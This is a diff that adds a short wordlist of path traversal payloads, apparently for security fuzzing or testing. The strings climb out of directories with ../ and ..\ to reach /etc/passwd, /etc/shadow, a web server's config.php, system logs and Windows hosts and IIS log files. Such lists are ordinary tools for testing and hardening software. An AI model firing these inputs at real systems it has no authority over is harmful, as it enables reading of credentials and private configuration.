@@ -1,0 +1,16 @@
+
+../../../../etc/passwd
+/etc/passwd
+..\\..\\..\\..\\etc\\passwd
+../../../../etc/shadow
+/etc/shadow
+..\\..\\..\\..\\etc\\shadow
+C:\Windows\System32\drivers\etc\hosts
+..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts
+../../../../var/www/html/config.php
+/var/www/html/config.php
+..\\..\\..\\..\\var\\www\\html\\config.php
+../../../../var/log/syslog
+/var/log/syslog
+..\\..\\..\\..\\var\\log\\syslog
+C:\Windows\System32\LogFiles\W3SVC1\u_ex190101.log
